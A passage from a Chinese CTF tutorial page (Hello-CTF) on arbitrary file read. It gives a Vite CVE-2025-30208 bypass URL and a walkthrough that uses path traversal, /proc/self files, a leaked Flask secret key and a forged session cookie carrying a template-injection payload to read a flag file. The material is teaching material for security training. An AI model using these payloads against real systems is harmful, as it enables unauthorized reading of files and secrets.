+<h3 id="vite-cve-2025-30208">Vite 任意文件读取（CVE-2025-30208）<a class="headerlink" href="#vite-cve-2025-30208" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/683979e358cb8da5c81dc1e8.png"></p>
+<p>CVE-2025-30208 是 Vite 开发服务器中 <code>@fs</code> 功能的 <strong>文件系统访问控制绕过</strong> 漏洞</p>
+<p>攻击者只需在请求 URL 中追加 <code>?raw??</code> 或 <code>?import&amp;raw??</code> 等参数</p>
+<p>即可绕过 <code>server.fs.deny</code> 限制，读取任意文件内容，包括项目根目录外的敏感文件</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>/@fs/flag?raw??
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68397f0958cb8da5c81e07e6.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter23\23-4.md -->
+<h3 id="procself">/proc/self/ 当前进程信息利用<a class="headerlink" href="#procself" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863eb5058cb8da5c884faa8.png"></p>
+<p>访问环境，任意输入 <code>ls</code></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863ec4a58cb8da5c8850348.png"></p>
+<p>网页将我们的输入值 ls 打印出来，可能存在模板注入</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863ece858cb8da5c8850caa.png"></p>
+<p>进一步进入 article 界面，测试 flag，模板注入 <code>{{1+2}}</code></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863ed4f58cb8da5c8850f9f.png"></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863ed5b58cb8da5c8850ffc.png"></p>
+<p>注意到输入为 <code>{{1+2}}</code> 时给出了路径</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863ed6558cb8da5c8851051.png"></p>
+<p>开始尝试路径穿越 <code>../../../../../../../etc/passwd</code>，获得 passwd 文件值</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863eddb58cb8da5c88515ad.png"></p>
+<p>利用 <code>/proc/self/environ</code> 获取当前程序的环境变量</p>
+<p>猜测 flag 存在于 <code>/home/sssssserver/flag</code>，但是还是显示无权限</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863ee4d58cb8da5c8851c36.png"></p>
+<p>利用 <code>/proc/self/cmdline</code> 获取当前程序命令行记录，发现 <code>python server.py</code> 命令，典型的使用了 flask 或 Django</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863ee9a58cb8da5c88520a1.png"></p>
+<p>进一步利用 <code>/proc/self/cwd</code> 获取当前进程目录，通过 <code>/proc/self/cwd/server.py</code> 得到源码 <code>server.py</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># 导入必要的模块</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span> 
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1"># Flask核心模块</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="p">(</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>    <span class="n">Flask</span><span class="p">,</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>    <span class="n">render_template</span><span class="p">,</span>  <span class="c1"># 渲染模板文件</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>    <span class="n">request</span><span class="p">,</span>          <span class="c1"># 处理HTTP请求</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>    <span class="n">url_for</span><span class="p">,</span>          <span class="c1"># URL生成</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>    <span class="n">redirect</span><span class="p">,</span>         <span class="c1"># 重定向</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>    <span class="n">session</span><span class="p">,</span>          <span class="c1"># 会话管理</span>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>    <span class="n">render_template_string</span>  <span class="c1"># 从字符串渲染模板（危险操作！）</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="p">)</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask_session</span><span class="w"> </span><span class="kn">import</span> <span class="n">Session</span>  <span class="c1"># 服务器端会话存储</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="c1"># 初始化Flask应用</span>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="c1"># !!! 高危安全警告 !!!</span>
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="c1"># 使用execfile动态执行外部Python文件</span>
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="c1"># 安全隐患：可能执行恶意代码，应该改用常规导入方式</span>
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="n">execfile</span><span class="p">(</span><span class="s1">'flag.py'</span><span class="p">)</span>  <span class="c1"># 加载flag.py文件，预期定义flag变量</span>
+<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a><span class="n">execfile</span><span class="p">(</span><span class="s1">'key.py'</span><span class="p">)</span>   <span class="c1"># 加载key.py文件，预期定义key变量</span>
+<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>
+<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a><span class="c1"># 从导入的文件中获取配置</span>
+<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a><span class="n">FLAG</span> <span class="o">=</span> <span class="n">flag</span>          <span class="c1"># 存储flag值</span>
+<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">key</span> <span class="c1"># 设置Flask应用的加密密钥</span>
+<a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>
+<a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a><span class="c1"># 路由定义：/n1page 接受GET和POST请求</span>
+<a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">"/n1page"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"GET"</span><span class="p">,</span> <span class="s2">"POST"</span><span class="p">])</span>
+<a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a><span class="k">def</span><span class="w"> </span><span class="nf">n1page</span><span class="p">():</span>
+<a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a>    <span class="c1"># 如果不是POST请求，重定向到首页</span>
+<a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">!=</span> <span class="s2">"POST"</span><span class="p">:</span>
+<a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a>        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">"index"</span><span class="p">))</span>
+<a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>
+<a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a>    <span class="c1"># 从表单获取n1code参数，如果不存在则为None</span>
+<a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a>    <span class="n">n1code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"n1code"</span><span class="p">)</span> <span class="ow">or</span> <span class="kc">None</span> 
+<a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a>
+<a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a>    <span class="c1"># !!! 不安全的输入过滤 !!!</span>
+<a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a>    <span class="c1"># 仅移除了部分特殊字符，过滤不充分</span>
+<a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a>    <span class="c1"># 安全隐患：可能导致模板注入攻击</span>
+<a id="__codelineno-6-41" name="__codelineno-6-41" href="#__codelineno-6-41"></a>    <span class="k">if</span> <span class="n">n1code</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+<a id="__codelineno-6-42" name="__codelineno-6-42" href="#__codelineno-6-42"></a>        <span class="n">n1code</span> <span class="o">=</span> <span class="n">n1code</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span>
+<a id="__codelineno-6-43" name="__codelineno-6-43" href="#__codelineno-6-43"></a>            <span class="s2">"_"</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"{"</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"}"</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span>
+<a id="__codelineno-6-44" name="__codelineno-6-44" href="#__codelineno-6-44"></a>
+<a id="__codelineno-6-45" name="__codelineno-6-45" href="#__codelineno-6-45"></a>    <span class="c1"># 会话管理逻辑</span>
+<a id="__codelineno-6-46" name="__codelineno-6-46" href="#__codelineno-6-46"></a>    <span class="k">if</span> <span class="s2">"n1code"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span> <span class="ow">or</span> <span class="n">session</span><span class="p">[</span><span class="s1">'n1code'</span><span class="p">]</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+<a id="__codelineno-6-47" name="__codelineno-6-47" href="#__codelineno-6-47"></a>        <span class="n">session</span><span class="p">[</span><span class="s1">'n1code'</span><span class="p">]</span> <span class="o">=</span> <span class="n">n1code</span>  <span class="c1"># 将过滤后的值存入session</span>
+<a id="__codelineno-6-48" name="__codelineno-6-48" href="#__codelineno-6-48"></a>        <span class="n">template</span> <span class="o">=</span> <span class="kc">None</span>
+<a id="__codelineno-6-49" name="__codelineno-6-49" href="#__codelineno-6-49"></a>
+<a id="__codelineno-6-50" name="__codelineno-6-50" href="#__codelineno-6-50"></a>    <span class="c1"># 如果session中有n1code值，渲染模板</span>
+<a id="__codelineno-6-51" name="__codelineno-6-51" href="#__codelineno-6-51"></a>    <span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s1">'n1code'</span><span class="p">]</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+<a id="__codelineno-6-52" name="__codelineno-6-52" href="#__codelineno-6-52"></a>        <span class="c1"># !!! 高危安全警告 !!!</span>
+<a id="__codelineno-6-53" name="__codelineno-6-53" href="#__codelineno-6-53"></a>        <span class="c1"># 直接使用字符串格式化拼接用户输入</span>
+<a id="__codelineno-6-54" name="__codelineno-6-54" href="#__codelineno-6-54"></a>        <span class="c1"># 可能导致XSS或模板注入漏洞</span>
+<a id="__codelineno-6-55" name="__codelineno-6-55" href="#__codelineno-6-55"></a>        <span class="n">template</span> <span class="o">=</span> <span class="s1">'''&lt;h1&gt;N1 Page&lt;/h1&gt;</span>
+<a id="__codelineno-6-56" name="__codelineno-6-56" href="#__codelineno-6-56"></a><span class="s1">        &lt;div class="row"&gt;</span>
+<a id="__codelineno-6-57" name="__codelineno-6-57" href="#__codelineno-6-57"></a><span class="s1">            &lt;div class="col-md-6 col-md-offset-3 center"&gt;</span>
+<a id="__codelineno-6-58" name="__codelineno-6-58" href="#__codelineno-6-58"></a><span class="s1">                Hello : </span><span class="si">%s</span><span class="s1">, why you don't look at our </span>
+<a id="__codelineno-6-59" name="__codelineno-6-59" href="#__codelineno-6-59"></a><span class="s1">                &lt;a href='/article?name=article'&gt;article&lt;/a&gt;?</span>
+<a id="__codelineno-6-60" name="__codelineno-6-60" href="#__codelineno-6-60"></a><span class="s1">            &lt;/div&gt;</span>
+<a id="__codelineno-6-61" name="__codelineno-6-61" href="#__codelineno-6-61"></a><span class="s1">        &lt;/div&gt;'''</span> <span class="o">%</span> <span class="n">session</span><span class="p">[</span><span class="s1">'n1code'</span><span class="p">]</span>
+<a id="__codelineno-6-62" name="__codelineno-6-62" href="#__codelineno-6-62"></a>
+<a id="__codelineno-6-63" name="__codelineno-6-63" href="#__codelineno-6-63"></a>        <span class="n">session</span><span class="p">[</span><span class="s1">'n1code'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span>  <span class="c1"># 使用后清空session值</span>
+<a id="__codelineno-6-64" name="__codelineno-6-64" href="#__codelineno-6-64"></a>        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>  <span class="c1"># 危险操作！</span>
+<a id="__codelineno-6-65" name="__codelineno-6-65" href="#__codelineno-6-65"></a>
+<a id="__codelineno-6-66" name="__codelineno-6-66" href="#__codelineno-6-66"></a><span class="c1"># 首页路由</span>
+<a id="__codelineno-6-67" name="__codelineno-6-67" href="#__codelineno-6-67"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"GET"</span><span class="p">])</span>
+<a id="__codelineno-6-68" name="__codelineno-6-68" href="#__codelineno-6-68"></a><span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
+<a id="__codelineno-6-69" name="__codelineno-6-69" href="#__codelineno-6-69"></a>    <span class="c1"># 渲染主页面模板</span>
+<a id="__codelineno-6-70" name="__codelineno-6-70" href="#__codelineno-6-70"></a>    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">"main.html"</span><span class="p">)</span>
+<a id="__codelineno-6-71" name="__codelineno-6-71" href="#__codelineno-6-71"></a>
+<a id="__codelineno-6-72" name="__codelineno-6-72" href="#__codelineno-6-72"></a><span class="c1"># 文章路由</span>
+<a id="__codelineno-6-73" name="__codelineno-6-73" href="#__codelineno-6-73"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/article'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">])</span>
+<a id="__codelineno-6-74" name="__codelineno-6-74" href="#__codelineno-6-74"></a><span class="k">def</span><span class="w"> </span><span class="nf">article</span><span class="p">():</span>
+<a id="__codelineno-6-75" name="__codelineno-6-75" href="#__codelineno-6-75"></a>    <span class="n">error</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-6-76" name="__codelineno-6-76" href="#__codelineno-6-76"></a>    <span class="c1"># 获取name参数，默认为'article'</span>
+<a id="__codelineno-6-77" name="__codelineno-6-77" href="#__codelineno-6-77"></a>    <span class="n">page</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'name'</span><span class="p">,</span> <span class="s1">'article'</span><span class="p">)</span>
+<a id="__codelineno-6-78" name="__codelineno-6-78" href="#__codelineno-6-78"></a>
+<a id="__codelineno-6-79" name="__codelineno-6-79" href="#__codelineno-6-79"></a>    <span class="c1"># !!! 不完善的安全检查 !!!</span>
+<a id="__codelineno-6-80" name="__codelineno-6-80" href="#__codelineno-6-80"></a>    <span class="c1"># 仅检查是否包含'flag'字符串</span>
+<a id="__codelineno-6-81" name="__codelineno-6-81" href="#__codelineno-6-81"></a>    <span class="c1"># 安全隐患：可能通过路径遍历访问其他文件</span>
+<a id="__codelineno-6-82" name="__codelineno-6-82" href="#__codelineno-6-82"></a>    <span class="k">if</span> <span class="s1">'flag'</span> <span class="ow">in</span> <span class="n">page</span><span class="p">:</span>
+<a id="__codelineno-6-83" name="__codelineno-6-83" href="#__codelineno-6-83"></a>        <span class="n">page</span> <span class="o">=</span> <span class="s1">'notallowed.txt'</span>
+<a id="__codelineno-6-84" name="__codelineno-6-84" href="#__codelineno-6-84"></a>
+<a id="__codelineno-6-85" name="__codelineno-6-85" href="#__codelineno-6-85"></a>    <span class="k">try</span><span class="p">:</span>
+<a id="__codelineno-6-86" name="__codelineno-6-86" href="#__codelineno-6-86"></a>        <span class="c1"># !!! 文件操作安全风险 !!!</span>
+<a id="__codelineno-6-87" name="__codelineno-6-87" href="#__codelineno-6-87"></a>        <span class="c1"># 直接拼接用户输入的文件路径</span>
+<a id="__codelineno-6-88" name="__codelineno-6-88" href="#__codelineno-6-88"></a>        <span class="c1"># 可能导致任意文件读取漏洞</span>
+<a id="__codelineno-6-89" name="__codelineno-6-89" href="#__codelineno-6-89"></a>        <span class="n">file_path</span> <span class="o">=</span> <span class="s1">'/home/nu11111111l/articles/</span><span class="si">{}</span><span class="s1">'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
+<a id="__codelineno-6-90" name="__codelineno-6-90" href="#__codelineno-6-90"></a>        <span class="n">template</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<a id="__codelineno-6-91" name="__codelineno-6-91" href="#__codelineno-6-91"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+<a id="__codelineno-6-92" name="__codelineno-6-92" href="#__codelineno-6-92"></a>        <span class="c1"># !!! 信息泄露风险 !!!</span>
+<a id="__codelineno-6-93" name="__codelineno-6-93" href="#__codelineno-6-93"></a>        <span class="c1"># 直接将异常信息返回给用户</span>
+<a id="__codelineno-6-94" name="__codelineno-6-94" href="#__codelineno-6-94"></a>        <span class="c1"># 可能暴露敏感系统信息</span>
+<a id="__codelineno-6-95" name="__codelineno-6-95" href="#__codelineno-6-95"></a>        <span class="n">template</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+<a id="__codelineno-6-96" name="__codelineno-6-96" href="#__codelineno-6-96"></a>
+<a id="__codelineno-6-97" name="__codelineno-6-97" href="#__codelineno-6-97"></a>    <span class="c1"># 渲染文章模板，传入读取的内容</span>
+<a id="__codelineno-6-98" name="__codelineno-6-98" href="#__codelineno-6-98"></a>    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'article.html'</span><span class="p">,</span> <span class="n">template</span><span class="o">=</span><span class="n">template</span><span class="p">)</span>
+<a id="__codelineno-6-99" name="__codelineno-6-99" href="#__codelineno-6-99"></a>
+<a id="__codelineno-6-100" name="__codelineno-6-100" href="#__codelineno-6-100"></a><span class="c1"># 主程序入口</span>
+<a id="__codelineno-6-101" name="__codelineno-6-101" href="#__codelineno-6-101"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+<a id="__codelineno-6-102" name="__codelineno-6-102" href="#__codelineno-6-102"></a>    <span class="c1"># 启动Flask应用</span>
+<a id="__codelineno-6-103" name="__codelineno-6-103" href="#__codelineno-6-103"></a>    <span class="c1"># 安全建议：生产环境应设置debug=False</span>
+<a id="__codelineno-6-104" name="__codelineno-6-104" href="#__codelineno-6-104"></a>    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</code></pre></div>
+<p>在 <code>key.py</code> 中得到密钥</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>key = 'Drmhze6EPcv0fN_81Bj-nA'
+</code></pre></div>
+<p>到这里时借用 <strong>Wilson Sumanang, Alexandre ZANNI</strong> 大佬的 <a href="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/scripts/flask_session_cookie_hack.py">flask session hack </a>脚本</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>python<span class="w"> </span>flask_session_cookie_hack.py<span class="w"> </span>decode<span class="w"> </span>-c<span class="w"> </span><span class="o">{</span>cookie<span class="o">}</span><span class="w"> </span>-s<span class="w"> </span><span class="o">{</span>secert_key<span class="o">}</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863f37558cb8da5c88545ff.png"></p>
+<p>执行解密脚本</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863f3c458cb8da5c885462c.png"></p>
+<p>然后把 <code>{'n1code': None}</code> 换成读文件 <code>flag.py</code> 的代码，加密回去</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="p">{</span><span class="s1">'n1code'</span><span class="p">:</span> <span class="s1">'{{</span><span class="se">\'\'</span><span class="s1">.__class__.__mro__[2].__subclasses__()[40](</span><span class="se">\'</span><span class="s1">flag.py</span><span class="se">\'</span><span class="s1">).read()}}'</span><span class="p">}</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863f56658cb8da5c88547c5.png"></p>
+<p>得到 cookie 值，修改网页 cookie 值，在表单填入任意值，完成对 <code>session['n1code']</code> 的修改</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863f59858cb8da5c8854810.png"></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6863f5a858cb8da5c8854818.png"></p></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../logical_vuln/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: 逻辑漏洞"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        逻辑漏洞
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../../hc-crypto/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: Crypto | 密码学"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        Crypto | 密码学
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#_1">任意文件读取</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_2">双写绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#jsp">JSP 网站敏感文件遍历读取</a>
+        
+      </li>
+    
+      <li>
+        <a href="#vite-cve-2025-30208">Vite 任意文件读取（CVE-2025-30208）</a>
+        
+      </li>
+    
+      <li>
+        <a href="#procself">/proc/self/ 当前进程信息利用</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
